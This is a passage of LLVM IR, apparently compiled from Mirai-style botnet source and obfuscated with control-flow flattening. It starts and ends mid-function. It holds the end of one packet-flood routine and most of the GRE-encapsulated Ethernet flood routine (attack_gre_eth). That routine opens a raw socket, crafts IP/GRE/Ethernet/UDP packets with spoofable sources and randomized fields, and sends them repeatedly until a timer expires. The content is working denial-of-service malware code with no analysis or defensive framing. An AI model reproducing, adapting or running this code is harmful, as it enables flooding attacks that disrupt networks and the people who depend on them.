  %323 = zext i16 %322 to i32
  %324 = icmp eq i32 %323, 65535
  %325 = select i1 %324, i32 1826047425, i32 -1584735889
  store i32 %325, i32* %switchVar
  br label %loopEnd

; <label>:326:                                    ; preds = %loopEntry
  %327 = call i32 @rand_next()
  %328 = and i32 %327, 65535
  %329 = trunc i32 %328 to i16
  %330 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 3
  store i16 %329, i16* %331, align 4
  %332 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %333 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %332, i32 0, i32 3
  %334 = load i16, i16* %333, align 4
  %335 = zext i16 %334 to i32
  %336 = sub nsw i32 %335, 1000
  %337 = xor i32 %336, -1
  %338 = trunc i32 %337 to i16
  %339 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  store i32 -1584735889, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i16, i16* %18, align 2
  %343 = zext i16 %342 to i32
  %344 = icmp eq i32 %343, 65535
  %345 = select i1 %344, i32 830193557, i32 -359924265
  store i32 %345, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = call i32 @rand_next()
  %348 = and i32 %347, 65535
  %349 = trunc i32 %348 to i16
  %350 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %351 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %350, i32 0, i32 0
  store i16 %349, i16* %351, align 2
  store i32 -359924265, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i16, i16* %19, align 2
  %354 = zext i16 %353 to i32
  %355 = icmp eq i32 %354, 65535
  %356 = select i1 %355, i32 -938061285, i32 1041029209
  store i32 %356, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = call i32 @rand_next()
  %359 = and i32 %358, 65535
  %360 = trunc i32 %359 to i16
  %361 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %362 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %361, i32 0, i32 1
  store i16 %360, i16* %362, align 2
  store i32 1041029209, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = load i8, i8* %22, align 1
  %365 = icmp ne i8 %364, 0
  %366 = select i1 %365, i32 1808474965, i32 -1398351799
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = call i32 @rand_next()
  %369 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %370 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %369, i32 0, i32 9
  store i32 %368, i32* %370, align 4
  store i32 -1163621198, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i32 0, i32 9
  %374 = load i32, i32* %373, align 4
  %375 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i32 0, i32 9
  store i32 %374, i32* %376, align 4
  store i32 -1163621198, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8, i8* %21, align 1
  %379 = icmp ne i8 %378, 0
  %380 = select i1 %379, i32 -1957271981, i32 -1107118081
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i8*, i8** %34, align 8
  %383 = load i32, i32* %20, align 4
  call void @rand_alpha_str(i8* %382, i32 %383)
  %384 = load i8*, i8** %34, align 8
  %385 = load i32, i32* %20, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds i8, i8* %384, i64 %386
  store i8 0, i8* %387, align 1
  store i32 -1107118081, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 7
  store i16 0, i16* %390, align 2
  %391 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %392 = bitcast %struct.iphdr* %391 to i16*
  %393 = call zeroext i16 @checksum_generic(i16* %392, i32 20)
  %394 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 7
  store i16 %393, i16* %395, align 2
  %396 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 7
  store i16 0, i16* %397, align 2
  %398 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %399 = bitcast %struct.iphdr* %398 to i16*
  %400 = call zeroext i16 @checksum_generic(i16* %399, i32 20)
  %401 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 7
  store i16 %400, i16* %402, align 2
  %403 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %404 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %403, i32 0, i32 3
  store i16 0, i16* %404, align 2
  %405 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %406 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %407 = bitcast %struct.udphdr* %406 to i8*
  %408 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %409 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %408, i32 0, i32 2
  %410 = load i16, i16* %409, align 2
  %411 = load i32, i32* %20, align 4
  %412 = sext i32 %411 to i64
  %413 = add i64 8, %412
  %414 = trunc i64 %413 to i32
  %415 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %405, i8* %407, i16 zeroext %410, i32 %414)
  %416 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %417 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %416, i32 0, i32 3
  store i16 %415, i16* %417, align 2
  %418 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %419 = load i32, i32* %11, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %418, i64 %420
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i32 0, i32 0
  %423 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %422, i32 0, i32 0
  store i16 2, i16* %423, align 4
  %424 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 9
  %426 = load i32, i32* %425, align 4
  %427 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %428 = load i32, i32* %11, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %427, i64 %429
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %430, i32 0, i32 0
  %432 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %431, i32 0, i32 2
  %433 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %432, i32 0, i32 0
  store i32 %426, i32* %433, align 4
  %434 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %435 = load i32, i32* %11, align 4
  %436 = sext i32 %435 to i64
  %437 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %434, i64 %436
  %438 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i32 0, i32 0
  %439 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %438, i32 0, i32 1
  store i16 0, i16* %439, align 2
  %440 = load i32, i32* %12, align 4
  %441 = load i8*, i8** %29, align 8
  %442 = load i32, i32* %20, align 4
  %443 = sext i32 %442 to i64
  %444 = add i64 52, %443
  %445 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %446 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %447 = load i32, i32* %11, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %449, i32 0, i32 0
  %451 = bitcast %struct.sockaddr_in* %450 to %struct.sockaddr*
  store %struct.sockaddr* %451, %struct.sockaddr** %445, align 8
  %452 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %453 = load %struct.sockaddr*, %struct.sockaddr** %452, align 8
  %454 = call i64 @sendto(i32 %440, i8* %441, i64 %444, i32 16384, %struct.sockaddr* %453, i32 16)
  store i32 -2108823308, i32* %switchVar
  br label %loopEnd

; <label>:455:                                    ; preds = %loopEntry
  %456 = load i32, i32* %11, align 4
  %457 = add nsw i32 %456, 1
  store i32 %457, i32* %11, align 4
  store i32 -123116853, i32* %switchVar
  br label %loopEnd

; <label>:458:                                    ; preds = %loopEntry
  %459 = call i64 @time(i64* null) #6
  %460 = load i32, i32* %24, align 4
  %461 = sext i32 %460 to i64
  %462 = icmp sgt i64 %459, %461
  %463 = select i1 %462, i32 -803274406, i32 -1803405990
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  store i32 1807705345, i32* %switchVar
  br label %loopEnd

; <label>:465:                                    ; preds = %loopEntry
  store i32 -857168966, i32* %switchVar
  br label %loopEnd

; <label>:466:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %465, %464, %458, %455, %388, %381, %377, %371, %367, %363, %357, %352, %346, %341, %326, %321, %317, %313, %292, %263, %257, %256, %255, %252, %236, %228, %222, %213, %209, %159, %155, %104, %98, %97, %94, %88, %87, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 19, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -858738453, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -858738453, label %first
    i32 -2122297464, label %95
    i32 -432661141, label %96
    i32 526659585, label %102
    i32 -1343192817, label %105
    i32 -650657571, label %106
    i32 -2009805432, label %112
    i32 2002761433, label %166
    i32 -1929320258, label %170
    i32 1843782786, label %223
    i32 -2086238894, label %227
    i32 -904725159, label %236
    i32 -1417657710, label %242
    i32 577459810, label %250
    i32 447779974, label %266
    i32 -1972996983, label %269
    i32 1882423928, label %270
    i32 1226545527, label %271
    i32 1445611083, label %277
    i32 2047567103, label %309
    i32 531598105, label %330
    i32 312995361, label %334
    i32 551767015, label %338
    i32 -2045073719, label %343
    i32 -887127950, label %358
    i32 -577808259, label %363
    i32 1198014889, label %369
    i32 1831989617, label %374
    i32 703521535, label %380
    i32 -30212044, label %384
    i32 -1527644927, label %388
    i32 -743498740, label %394
    i32 675631217, label %420
    i32 -701296198, label %427
    i32 108923829, label %494
    i32 -868749097, label %497
    i32 -490230844, label %503
    i32 -859993344, label %504
    i32 1698751707, label %505
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %93 = icmp eq i32 %.reload, -1
  %94 = select i1 %93, i32 -2122297464, i32 -432661141
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1698751707, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %97 = load i32, i32* %12, align 4
  %98 = bitcast i32* %11 to i8*
  %99 = call i32 @setsockopt(i32 %97, i32 0, i32 3, i8* %98, i32 4) #6
  %100 = icmp eq i32 %99, -1
  %101 = select i1 %100, i32 526659585, i32 -1343192817
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %12, align 4
  %104 = call i32 @close(i32 %103)
  store i32 1698751707, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -650657571, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %11, align 4
  %108 = load i8, i8* %7, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  %111 = select i1 %110, i32 -2009805432, i32 -1972996983
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %114 = load i8**, i8*** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8*, i8** %114, i64 %116
  store i8* %113, i8** %117, align 8
  %118 = load i8**, i8*** %13, align 8
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %25, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.grehdr*
  store %struct.grehdr* %126, %struct.grehdr** %26, align 8
  %127 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %128 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %127, i64 1
  %129 = bitcast %struct.grehdr* %128 to %struct.ethhdr*
  store %struct.ethhdr* %129, %struct.ethhdr** %27, align 8
  %130 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %131 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %130, i64 1
  %132 = bitcast %struct.ethhdr* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %28, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.udphdr*
  store %struct.udphdr* %135, %struct.udphdr** %29, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, 15
  %140 = or i8 %139, 64
  store i8 %140, i8* %137, align 4
  %141 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, -16
  %145 = or i8 %144, 5
  store i8 %145, i8* %142, align 4
  %146 = load i8, i8* %14, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 1
  store i8 %146, i8* %148, align 1
  %149 = load i32, i32* %20, align 4
  %150 = sext i32 %149 to i64
  %151 = add i64 66, %150
  %152 = trunc i64 %151 to i16
  %153 = call zeroext i16 @htons(i16 zeroext %152) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 2
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %15, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %156) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 3
  store i16 %157, i16* %159, align 4
  %160 = load i8, i8* %16, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 5
  store i8 %160, i8* %162, align 4
  %163 = load i8, i8* %17, align 1
  %164 = icmp ne i8 %163, 0
  %165 = select i1 %164, i32 2002761433, i32 -1929320258
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 4
  store i16 %167, i16* %169, align 2
  store i32 -1929320258, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 6
  store i8 47, i8* %172, align 1
  %173 = load i32, i32* %23, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 8
  store i32 %173, i32* %175, align 4
  %176 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i64 %178
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i32 0, i32 1
  %181 = load i32, i32* %180, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 9
  store i32 %181, i32* %183, align 4
  %184 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %185 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %186 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %185, i32 0, i32 1
  store i16 %184, i16* %186, align 2
  %187 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %188 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %189 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %188, i32 0, i32 2
  store i16 %187, i16* %189, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %191 = bitcast %struct.iphdr* %190 to i8*
  %192 = load i8, i8* %191, align 4
  %193 = and i8 %192, 15
  %194 = or i8 %193, 64
  store i8 %194, i8* %191, align 4
  %195 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %196 = bitcast %struct.iphdr* %195 to i8*
  %197 = load i8, i8* %196, align 4
  %198 = and i8 %197, -16
  %199 = or i8 %198, 5
  store i8 %199, i8* %196, align 4
  %200 = load i8, i8* %14, align 1
  %201 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 1
  store i8 %200, i8* %202, align 1
  %203 = load i32, i32* %20, align 4
  %204 = sext i32 %203 to i64
  %205 = add i64 28, %204
  %206 = trunc i64 %205 to i16
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 2
  store i16 %207, i16* %209, align 2
  %210 = load i16, i16* %15, align 2
  %211 = zext i16 %210 to i32
  %212 = xor i32 %211, -1
  %213 = trunc i32 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 3
  store i16 %214, i16* %216, align 4
  %217 = load i8, i8* %16, align 1
  %218 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 5
  store i8 %217, i8* %219, align 4
  %220 = load i8, i8* %17, align 1
  %221 = icmp ne i8 %220, 0
  %222 = select i1 %221, i32 1843782786, i32 -2086238894
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %225 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 4
  store i16 %224, i16* %226, align 2
  store i32 -2086238894, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 6
  store i8 17, i8* %229, align 1
  %230 = call i32 @rand_next()
  %231 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 8
  store i32 %230, i32* %232, align 4
  %233 = load i8, i8* %22, align 1
  %234 = icmp ne i8 %233, 0
  %235 = select i1 %234, i32 -904725159, i32 -1417657710
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  store i32 577459810, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 8
  %245 = load i32, i32* %244, align 4
  %246 = sub i32 %245, 1024
  %247 = xor i32 %246, -1
  %248 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 9
  store i32 %247, i32* %249, align 4
  store i32 577459810, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i16, i16* %18, align 2
  %252 = call zeroext i16 @htons(i16 zeroext %251) #7
  %253 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  %255 = load i16, i16* %19, align 2
  %256 = call zeroext i16 @htons(i16 zeroext %255) #7
  %257 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %258 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %257, i32 0, i32 1
  store i16 %256, i16* %258, align 2
  %259 = load i32, i32* %20, align 4
  %260 = sext i32 %259 to i64
  %261 = add i64 8, %260
  %262 = trunc i64 %261 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %265 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %264, i32 0, i32 2
  store i16 %263, i16* %265, align 2
  store i32 447779974, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i32, i32* %11, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %11, align 4
  store i32 -650657571, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  store i32 1882423928, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1226545527, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i32, i32* %11, align 4
  %273 = load i8, i8* %7, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %272, %274
  %276 = select i1 %275, i32 1445611083, i32 -868749097
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8**, i8*** %13, align 8
  %279 = load i32, i32* %11, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds i8*, i8** %278, i64 %280
  %282 = load i8*, i8** %281, align 8
